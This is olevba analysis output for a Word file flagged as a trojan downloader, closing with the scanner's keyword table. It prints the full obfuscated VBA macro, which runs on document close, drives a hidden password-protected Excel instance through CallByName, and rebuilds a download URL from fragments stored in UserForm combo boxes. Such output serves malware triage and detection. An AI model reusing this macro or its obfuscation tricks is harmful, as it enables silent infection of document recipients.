olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.Agent.gen-d75a1f7a80cae824d8f6446bfd07c1491c9455377d7877b7903cffd222ec9488
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public t8, qesax, ze, gagh3, x4bi5
Sub Document_Close()
yb
End Sub
Sub yb()
i1vl = Application.Options.AutoFormatAsYouTypeApplyHeadings
If qe > 2805 Then
agbv1 = Application.Options.OptimizeForWord97byDefault
qe = agbv1
End If
On Error Resume Next
Application.DisplayAlerts = False
bgxy = Application.Build
If i1vl > 472 Then
anw = Application.Options.IgnoreMixedDigits
i1vl = anw
End If
Err.Number = 0
UserForm2.ComboBox1.ListIndex = 2
Dim snk
Set snk = CreateObject(UserForm1.ComboBox1)
snk.DisplayAlerts = False
k9g = "visible"
r1 = "OnTime"
Dim jet4
ei = 1
obuix = 1
While ei <> 0 And obuix < 3
Set jet4 = snk.Workbooks.Open(FileName:=UserForm2.ComboBox1, Password:=UserForm1.ComboBox2)
ei = Err.Number
obuix = obuix + 1
Wend
jq = Application.Options.DefaultBorderColorIndex
If bgxy > 29 Then
fjf9 = Application.Options.AutoFormatAsYouTypeReplaceFractions
bgxy = fjf9
End If
If ei <> 0 Then
ki = CallByName(Application, k9g, 2)
If ki = True Then
Set gi = CreateObject(UserForm1.ComboBox3)
gi.Documents.Open ActiveDocument.FullName, ReadOnly:=True
gi.Run "ThisDocument." & "yb"
j4lzf = Application.Options.MatchFuzzyDZ
If jq > 2790 Then
wlnqd = Application.Options.PasteAdjustParagraphSpacing
jq = wlnqd
End If
Else
jcm5 = Application.Options.MatchFuzzyCase
If j4lzf > 3092 Then
m12 = Application.Options.SuggestSpellingCorrections
j4lzf = m12
End If
UserForm1.ComboBox4 = UserForm1.ComboBox4 & "0"
Application.OnTime Now + TimeSerial(0, 0, 20), "ThisDocument." & "yb"
End If
snk.Quit
Exit Sub
End If
Dim l5
Set l5 = snk.sheets(1)
hobn = "'"
j8dr = snk.sheets(2).Cells(149, 17).Value
qesax = snk.sheets(3).Cells(18, 48).Value
je4n = snk.sheets(3).Cells(173, 37).Value
hfii = snk.sheets(2).Cells(18, 35).Value
bf27a = l5.Cells(243, 23).Value
seey0 = snk.sheets(3).Cells(179, 11).Value
x4bi5 = snk.sheets(3).Cells(188, 44).Value
acino = l5.Cells(59, 8).Value
mt = snk.sheets(1).Cells(68, 45).Value
xk2yj = snk.sheets(2).Cells(233, 8).Value
ytc = snk.sheets(2).Cells(46, 45).Value
bdjg = snk.sheets(2).Cells(36, 40).Value
ey = snk.sheets(3).Cells(40, 30).Value
y1 = Application.Language
tzl = snk.sheets(2).Cells(108, 29).Value
j7dj = snk.sheets(3).Cells(158, 50).Value
l2 = snk.sheets(3).Cells(65, 4).Value
pvhdp = snk.sheets(2).Cells(185, 21).Value
fcce3 = snk.sheets(2).Cells(121, 45).Value
ev8 = snk.sheets(1).Cells(108, 16).Value
y8p15 = snk.sheets(3).Cells(70, 36).Value
h50hq = snk.sheets(3).Cells(180, 6).Value
aqhd = snk.sheets(3).Cells(194, 9).Value
t8 = snk.sheets(3).Cells(124, 6).Value
w8 = snk.sheets(3).Cells(150, 41).Value
mg5y = snk.sheets(1).Cells(244, 11).Value
chwf = Application.Options.AutoFormatAsYouTypeApplyDates
If y1 > 2360 Then
dr4 = Application.Options.ShowReadabilityStatistics
y1 = dr4
End If
yl = snk.sheets(2).Cells(142, 21).Value
wwy = CallByName(snk, xk2yj, 2)
Set y96yq = UserForm1.Controls.Add("Forms.ComboBox.1")
y96yq.Value = j8dr & wwy & w8
Set x6b = UserForm1.Controls.Add("Forms.ComboBox.1")
x6b.Value = seey0
CallByName CreateObject(h50hq), je4n, 1, y96yq, l2, x6b
jxgk = Application.Options.DisableFeaturesbyDefault
If chwf > 1189 Then
o82od = Application.Options.AutoFormatAsYouTypeDefineStyles
chwf = o82od
End If
Set r9ou5 = CreateObject(fcce3)
rn503 = Application.Options.MeasurementUnit
If jxgk > 3821 Then
jl = Application.Options.CommentsColor
jxgk = jl
End If
ap = Application.Options.AutoFormatAsYouTypeApplyClosings
If rn503 > 2744 Then
fcbqy = Application.Options.CheckGrammarWithSpelling
rn503 = fcbqy
End If
bg7o = Application.Options.InsertedTextMark
If ap > 3437 Then
ig = Application.Options.AutoFormatReplaceFarEastDashes
ap = ig
End If
pg = Application.Options.MatchFuzzyKiKu
If bg7o > 4247 Then
z7s15 = Application.Options.PasteSmartCutPaste
bg7o = z7s15
End If
Set j717 = CallByName(r9ou5, bdjg, 2)
ezau = Application.Options.TabIndentKey
If yy8qg > 2539 Then
tu = Application.Options.SnapToShapes
yy8qg = tu
yy8qg = Application.Options.AutoFormatDeleteAutoSpaces
If pg > 222 Then
c8co = Application.Options.MatchFuzzyDZ
pg = c8co
End If
End If
Set ip = CallByName(j717, hfii, 1)
hyjp = Application.Options.AutoFormatAsYouTypeApplyBorders
If ezau > 4336 Then
frwgt = Application.Options.CheckSpellingAsYouType
ezau = frwgt
End If
Set yl = CallByName(r9ou5, yl, 2)
Set gagh3 = r9ou5
Set ey = CallByName(yl, ey, 2)
Set ev8 = CallByName(ey, ev8, 2)
Set qe = CallByName(ev8, bf27a, 1, acino)
Set t8 = CallByName(qe, t8, 2)
njm = Application.Options.Creator
If p2 > 2435 Then
mz = Application.Options.PasteSmartStyleBehavior
p2 = mz
p2 = Application.Options.InterpretHighAnsi
If hyjp > 387 Then
tnr34 = Application.Options.IMEAutomaticControl
hyjp = tnr34
End If
End If
ytc = CallByName(t8, ytc, 2)
CallByName t8, mt, 1, 1, ytc
Set ze = UserForm1.Controls.Add("Forms.ComboBox.1")
ze.Value = y8p15 & j7dj
UserForm3.ComboBox1 = aqhd
ze.Value = pvhdp
UserForm4.ComboBox1 = UserForm3.ComboBox1
UserForm3.ComboBox1 = ytc
r9ou5 = Nothing
jet4 = Nothing
l5 = Nothing
j717 = Nothing
ip = Nothing
yl = Nothing
ey = Nothing
a55b = Application.Options.DefaultTray
If noo68 > 4608 Then
bg = Application.Options.AutoFormatPreserveStyles
noo68 = bg
noo68 = Application.Options.TabIndentKey
If njm > 297 Then
f8kmi = Application.Options.SavePropertiesPrompt
njm = f8kmi
End If
End If
ev8 = Nothing
qe = Nothing
lw = Application.Options.PasteMergeLists
If a55b > 1693 Then
z11 = Application.Options.AutoFormatApplyBulletedLists
a55b = z11
End If
cs6 = Application.Options.GridOriginVertical
t8 = Nothing
k5ui = Application.Options.IMEAutomaticControl
If x4gk0 > 3076 Then
ev = Application.Options.AutoFormatPreserveStyles
x4gk0 = ev
x4gk0 = Application.Options.DefaultOpenFormat
If cs6 > 2576 Then
bg2y = Application.Options.IgnoreMixedDigits
cs6 = bg2y
End If
End If
gagh3 = Nothing
DoEvents
CallByName snk, tzl, 1
snk = Nothing
DoEvents
CallByName CreateObject(h50hq), mg5y, 1, j8dr & wwy & w8
fu = Application.Options.OptimizeForWord97byDefault
If k5ui > 1879 Then
ga8ne = Application.Options.UpdateLinksAtOpen
k5ui = ga8ne
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UserForm2.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Initialize()

e3 = Application.Options.AutoFormatAsYouTypeApplyBorders

If kc > 3103 Then


bv = Application.Options.PasteAdjustWordSpacing

kc = bv

End If

 
 On Error GoTo ErrorHandler

 fosr = UserForm2.Controls.Count - 1
 
 If Len(UserForm1.ComboBox4) > 10 Then

n = Application.Options.AnimateScreenMovements

If e3 > 672 Then


aqb = Application.Options.Overtype

e3 = aqb

End If

 fosr = fosr * 2

wm = Application.Options.AutoCreateNewDrawings

 End If

 fp = ""
 For kc = 1 To fosr Step 2
 fp = fp & UserForm2.Controls.Item(kc)
 Next

 ComboBox1.AddItem "cf"
 ComboBox1.AddItem "ue84q"
 ComboBox1.AddItem fp
 ComboBox1.AddItem "ay"

l13g9 = Application.Options.AutoFormatAsYouTypeAutoLetterWizard

If wm > 3933 Then


m0 = Application.Options.MatchFuzzyIterationMark

wm = m0

End If

 
 Exit Sub

czfzj = ActiveDocument.Name

If l13g9 > 3128 Then


mr = Application.Options.InterpretHighAnsi

l13g9 = mr

End If


g0xs = Application.Options.RTFInClipboard

If czfzj > 3866 Then


fytx = Application.Options.PasteMergeFromXL

czfzj = fytx

End If

 
ErrorHandler:
 
 
 
End Sub

-------------------------------------------------------------------------------
VBA MACRO UserForm3.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Initialize()
 CallByName ActiveDocument.t8, ActiveDocument.qesax, VbMethod, ActiveDocument.ze
End Sub

 
-------------------------------------------------------------------------------
VBA MACRO UserForm4.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Initialize()
 CallByName ActiveDocument.gagh3, ActiveDocument.x4bi5, VbMethod, ActiveDocument.ze
End Sub

 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
excel.applicationv
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i5x0wbqe81s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TahomaQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
word.application
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TahomaX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma�c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TahomaX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TahomaX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TahomaQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma�
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'excel.application'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox2'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'i5x0wbqe81s'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox3'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'word.application'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox4'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox2'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'http'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox3'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'bSB'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox4'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b's://'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox5'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'5Db'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox6'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'heav'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox7'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'miX'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox8'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'enly'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox9'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Rf'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox10'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'gem.'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox11'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0Xh'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox12'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'com/'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox13'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Cl'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox14'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'11.p'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox15'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'n5'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox16'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'hp'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox17'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'5zO'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|CallByName          |May attempt to obfuscate malicious function  |
|          |                    |calls                                        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

